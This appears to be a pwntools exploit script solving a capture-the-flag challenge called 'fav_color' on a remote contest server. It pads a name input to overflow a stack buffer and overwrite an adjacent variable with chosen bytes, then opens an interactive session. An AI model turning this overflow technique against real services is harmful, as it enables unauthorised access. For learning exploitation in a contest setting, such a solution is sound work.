from pwn import *

context.binary = elf = ELF('./fav_color')
context.log_level = 'debug'
io = remote('tjc.tf', 31453)
to_fill = 0x30 - 0xb  # found in IDA stack using var of name scanf - var of rgb
print(to_fill)

rgb = b'1'  # useless
io.sendline(rgb)

name = b'A' * to_fill + (chr(52) + chr(84) + chr(50)).encode()  # overflow name then overwrite rgb but in reverse direction as they were declared due to stack
io.sendline(name)
io.interactive()
